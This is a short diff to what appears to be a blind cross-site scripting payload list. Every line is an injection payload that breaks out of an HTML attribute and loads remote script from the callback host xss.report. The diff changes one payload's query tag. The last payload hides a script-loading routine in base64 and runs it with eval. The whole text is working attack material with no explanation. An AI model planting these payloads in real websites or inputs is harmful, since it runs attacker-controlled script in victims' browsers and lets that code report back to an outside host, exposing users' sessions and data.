@@ -1,4 +1,4 @@
 '"><svg/onload=import('//xss.report/c/hnterx?q')>
 '"><script src=https://xss.report/c/hnterx?s></script>
-<img/src/onerror=import('//xss.report/c/hnterx?i');//>
+'"><img/src/onerror=import('//xss.report/c/hnterx?gp');//>
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2hudGVyeCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
